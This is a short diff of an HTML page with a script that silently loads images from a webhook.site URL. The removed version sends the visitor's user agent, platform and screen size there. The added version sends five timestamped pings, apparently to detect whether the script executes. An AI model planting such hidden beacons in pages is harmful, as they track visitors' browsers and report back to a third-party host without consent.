@@ -1,13 +1,14 @@
+<html>
+<body>
+
 <script>
 
-var data =
-navigator.userAgent +
-"|" +
-navigator.platform +
-"|" +
-screen.width + "x" + screen.height;
-
-new Image().src =
-"https://webhook.site/de72465a-4cd7-4ab7-903a-e2adf31ea27f/browser-"+encodeURIComponent(data);
+for (let i = 0; i < 5; i++) {
+  new Image().src =
+  "https://webhook.site/de72465a-4cd7-4ab7-903a-e2adf31ea27f/exec-"+i+"-"+Date.now();
+}
 
 </script>
+
+</body>
+</html>
